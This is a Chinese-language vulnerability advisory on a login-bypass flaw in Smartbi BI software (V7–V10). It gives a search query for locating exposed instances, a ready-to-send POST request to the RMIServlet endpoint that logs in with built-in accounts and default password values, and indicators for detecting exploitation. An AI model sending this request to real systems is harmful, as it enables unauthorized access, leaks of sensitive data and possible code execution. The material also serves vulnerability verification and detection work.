# Smartbi商业智能软件绕过登录漏洞

## 漏洞描述

Smartbi大数据分析产品融合BI定义的所有阶段，对接各种业务数据库、数据仓库和大数据分析平台，进行加工处理、分析挖掘和可视化展现；满足所有用户的各种数据分析应用需求，如大数据分析、可视化分析、探索式分析、复杂报表、应用分享等等。

Smartbi在安装时会内置几个用户，在使用特定接口时，可绕过用户身份认证机制获取其身份凭证，随后可使用获取的身份凭证调用后台接口，可能导致敏感信息泄露和代码执行。

## 影响范围

V7 <= Smartbi <= V10

网络空间测绘语法：app="SMARTBI"

## 漏洞复现

验证漏洞是否存在：<http://your-ip/smartbi/vision/RMIServlet>

如果返回信息中包含尚未登录或者会话已超时，则证明存在该漏洞

POC

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: your-ip
Content-Type: application/x-www-form-urlencoded
 
className=UserService&methodName=loginFromDB&params=["system","0a"]
```

请求体中传入的三个参数

className：必须指定UserService类名

methodName：该类调用的方法loginFromDB

params：其中的第一个参数是内置的三个用户名（public、service、system）可随机构造，第二个参数是三个账号默认的密文密码(默认值为0a)

## 研判分析

总体上来说该漏洞研判起来较为简单。

- 请求方法和请求路径，'POST'、'/smartbi/vision/RMIServlet'
- 请求内容，className，public，service，system，0a
- 响应状态码200，响应内容"result:true"

## 参考链接

Smartbi内置用户登陆绕过漏洞复现

<https://blog.csdn.net/qq_41904294/article/details/131293172>
